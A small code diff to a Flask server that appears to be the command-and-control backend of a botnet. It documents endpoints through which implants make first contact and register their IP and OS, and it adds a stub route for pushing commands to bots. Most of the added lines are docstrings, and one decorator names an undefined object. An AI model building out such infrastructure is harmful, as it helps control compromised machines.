@@ -55,9 +55,10 @@ def hello_world():
     return "Hello, world!"
 
 @app.route('/firstcontact', methods=['POST'])
-def firstcontact():
+def firstcontact(): 
     """
     Description: Endpoint which retrieves first contact from the bot. 
+    
     [POST] 
         - (str) firstcontactkey : firstcontact key to identify if the 
         contact is coming from the implant or not 
@@ -87,6 +88,16 @@ def firstcontact():
 
 @app.route('/register', methods=['POST'])
 def register():
+    """
+    Description: Register a new bot to the server 
+
+    [POST] 
+        - (str) registerkey = Register key that is needed for the registration process. 
+        The key could be obtained through the firstcontact. 
+
+        - (str) ip = IP address of the bot 
+        - (str) os = OS type (Nix/Windows) of the bot 
+    """
     if request.method != 'POST':
         return jsonify({'error': 'wrong HTTP method'})
 
@@ -134,6 +145,14 @@ def register():
 
     except Exception as e:
         return '' 
+
+@appr.route('/bot/<id>/push', methods=['POST', 'PUT'])
+def bottask(id):
+    """
+    TODO: This + cmd Model 
+    Description: Pushes the command into the cmd Model. Remember to create cmd Model for the database!
+    """
+    pass
 
 
 # TODO: Change to POST, implement master authentication for OPSEC 
